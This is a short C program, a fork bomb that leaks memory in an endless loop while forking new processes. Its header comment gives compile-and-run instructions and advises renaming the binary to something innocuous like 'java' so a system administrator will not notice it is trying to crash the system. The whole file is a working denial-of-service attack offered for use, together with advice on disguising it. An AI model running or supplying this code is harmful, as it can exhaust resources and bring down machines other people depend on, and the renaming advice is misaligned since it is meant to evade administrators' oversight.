/*
	I suggest you change executable name, because system admin
	could understand that you try to kill system =)
	***    gcc-4.7 -O2 leak.c -o java && ./java
	the ./java is example, you could change it to sth else
*/
#include <stdlib.h>
void leak(void) {
	float * a = malloc(sizeof(float) * 85);
};
int main(int argc, char *argv[]) {
	while (1) {
		leak();
		fork(argv[0]);
	}
}

